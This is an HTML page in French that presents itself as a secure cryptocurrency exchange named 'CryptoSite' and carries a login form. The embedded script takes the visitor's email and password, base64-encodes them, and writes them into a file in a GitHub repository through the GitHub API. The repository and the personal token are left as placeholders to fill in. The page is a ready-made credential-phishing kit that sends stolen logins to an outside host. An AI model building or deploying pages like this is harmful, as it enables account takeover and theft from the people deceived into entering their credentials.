<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoSite</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #14151a;
            color: #eaeaea;
        }
        header {
            background-color: #212121;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        header img {
            height: 50px;
            width: auto;
        }
        nav {
            display: flex;
            gap: 20px;
        }
        nav a {
            color: #fff;
            text-decoration: none;
            font-size: 14px;
        }
        nav a:hover {
            text-decoration: underline;
        }
        .hero {
            background: linear-gradient(to right, #4CAF50, #45a049);
            color: white;
            text-align: center;
            padding: 50px 20px;
        }
        .hero h1 {
            margin: 0;
            font-size: 2.5em;
        }
        .hero p {
            margin-top: 10px;
            font-size: 1.2em;
        }
        .form-container {
            background: #212121;
            padding: 20px;
            margin: 50px auto;
            max-width: 400px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        input, button {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            font-size: 14px;
        }
        button {
            background-color: #f3ba2f;
            color: #14151a;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #d69b25;
        }
        footer {
            text-align: center;
            padding: 20px;
            background: #212121;
            color: #fff;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <header>
        <img src="https://via.placeholder.com/150x40?text=CryptoSite" alt="Logo">
        <nav>
            <a href="#">Accueil</a>
            <a href="#">À propos</a>
            <a href="#">Sécurité</a>
            <a href="#">Contact</a>
        </nav>
    </header>

    <section class="hero">
        <h1>Échangez vos cryptomonnaies en toute sécurité</h1>
        <p>La plateforme la plus rapide et sécurisée pour vos transactions.</p>
    </section>

    <div class="form-container">
        <form id="loginForm">
            <label for="email">Adresse email</label>
            <input type="email" id="email" name="email" placeholder="Entrez votre email" required>
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
            <button type="submit">Envoyer</button>
        </form>
    </div>

    <footer>
        &copy; 2024 CryptoSite. Tous droits réservés.
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (event) => {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const data = {
                email: email,
                password: password
            };

            try {
                const response = await fetch('https://api.github.com/repos/<TON-NOM-DUTILISATEUR>/<TON-DÉPÔT>/contents/data.json', {
                    method: 'PUT',
                    headers: {
                        'Authorization': 'Bearer <TON-TOKEN-PERSONNEL>',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        message: "Ajout des identifiants",
                        content: btoa(JSON.stringify(data))
                    })
                });

                if (response.ok) {
                    alert('Identifiants sauvegardés sur GitHub!');
                } else {
                    alert('Erreur lors de la sauvegarde.');
                }
            } catch (error) {
                console.error('Erreur:', error);
                alert('Impossible de sauvegarder les identifiants.');
            }
        });
    </script>
</body>
</html>
